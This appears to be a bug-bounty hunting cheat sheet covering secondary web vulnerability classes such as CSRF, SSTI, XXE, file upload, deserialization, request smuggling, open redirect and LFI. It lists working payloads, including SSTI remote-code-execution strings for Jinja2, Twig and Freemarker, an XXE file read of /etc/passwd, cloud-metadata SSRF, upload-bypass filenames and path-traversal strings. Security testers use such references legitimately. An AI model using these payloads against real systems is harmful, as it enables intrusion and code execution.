# 08 — Hunt Webapp: Secondary Classes

Distilled from `hunt-csrf`, `hunt-ssti`, `hunt-xxe`, `hunt-file-upload`, `hunt-race-condition`, `hunt-deserialization`, `hunt-cache-poison`, `hunt-http-smuggling`, `hunt-open-redirect`, `hunt-lfi`.

---

## CSRF — 15 reports

CSRF only pays when chained:
- CSRF → ATO (change email/password)
- CSRF → Admin action (delete users, modify settings)
- CSRF → OAuth token theft

Detection: check for CSRF token, `SameSite` cookie, `Origin`/`Referer` validation.
Bypass: remove token, reuse another user's token, JSON content-type, subdomain origin.

---

## SSTI

Detection: `{{7*7}}` → 49 (Jinja2/Twig), `${7*7}` → 49 (Thymeleaf), `<%= 7*7 %>` → 49 (ERB)

RCE by engine:
- **Jinja2**: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig**: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

---

## XXE — 10 reports

Basic: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
Blind: external DTD reference → callback to attacker server
SSRF via XXE: target `169.254.169.254` for cloud metadata

Where: file upload (DOCX/SVG), XML APIs, SAML, SOAP endpoints.

---

## File Upload — 10 techniques

1. Double extension: `shell.php.jpg`
2. Null byte: `shell.php%00.jpg`
3. Magic bytes: GIF89a header on PHP
4. Polyglot: valid JPEG + PHP code
5. Content-Type spoof
6. Path traversal in filename: `../../shell.php`
7. SVG XSS: `<script>` in SVG
8. SVG XXE: `<!DOCTYPE>` in SVG
9. Filename case: `shell.pHp`
10. RTL override: `shell.php\u202Egpj`

---

## Race Conditions — 12 reports

TOCTOU: check permission → permission changes → action proceeds.
Parallel requests: 10 simultaneous coupon redemptions → all succeed.
Detection: Burp Turbo Intruder, send N identical requests simultaneously.

---

## Deserialization — 22 reports

- Java: ysoserial gadget chains (CommonsCollections, Spring, Groovy)
- PHP: phpggc (Laravel/RCE1, Symfony)
- Python: pickle `__reduce__` → `os.system`
- .NET: BinaryFormatter, ObjectDataProvider XAML

---

## Web Cache Poisoning — 10 reports

Unkeyed headers: `X-Forwarded-Host`, `X-Original-URL`
Cache deception: path tricks that fool CDN into caching dynamic pages

---

## HTTP Request Smuggling

CL.TE: Content-Length shorter than Transfer-Encoding body → request merge.
TE.CL: Transfer-Encoding present, CL shorter → different interpretation.
H2.CL: HTTP/2 → HTTP/1.1 downgrade mismatch.

---

## Open Redirect — 28 reports

Bypass: `//evil.com`, `https://target.com@evil.com`, double encoding, CRLF injection.
Chain: Open redirect → OAuth token theft → ATO.

---

## LFI / Path Traversal — 31 reports

Basic: `../../../../etc/passwd`
PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
Log poisoning: inject PHP in User-Agent → LFI to access.log

---

*Source: hunt-csrf (15), hunt-ssti, hunt-xxe (10), hunt-file-upload, hunt-race-condition (12), hunt-deserialization (22), hunt-cache-poison (10), hunt-open-redirect (28), hunt-lfi (31)*
